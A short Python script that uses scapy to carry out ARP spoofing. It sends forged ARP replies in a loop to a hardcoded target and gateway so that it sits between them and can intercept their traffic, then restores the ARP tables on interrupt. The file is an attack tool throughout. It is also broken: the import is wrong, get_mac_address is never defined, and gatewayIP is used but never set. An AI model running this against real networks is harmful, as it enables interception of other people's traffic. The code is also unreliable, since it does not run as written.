from scapy.all import scapy

# import scapy
import time
import argparse
import sys


targetIP = "192.168.0.101"
spoofIP = "192.168.0.1"
definitionMAC = "fc:b3:bc:e3:4d:06"

sourceMAC = "48:e7:da:a8:8b:bb"
sourceIP = "192.168.0.102"


def spoofer(targetIP, spoofIP):
    destinationMac = get_mac_address(targetIP)
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationMac, psrc=spoofIP)
    scapy.send(packet, verbose=False)


def restore(destinationIP, sourceIP):
    packet = scapy.ARP(
        op=2,
        pdst=destinationIP,
        hwdst=get_mac_address(destinationIP),
        psrc=sourceIP,
        hwsrc=sourceMAC,
    )
    scapy.send(packet, count=4, verbose=False)


packets = 0
try:
    while True:
        spoofer(targetIP, gatewayIP)
        spoofer(gatewayIP, targetIP)
        print("\r[+] Sent packets " + str(packets)),
        sys.stdout.flush()
        packets += 2
        time.sleep(2)

except KeyboardInterrupt:
    print(
        "\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state.."
    )
    restore(targetIP, gatewayIP)
    restore(gatewayIP, targetIP)
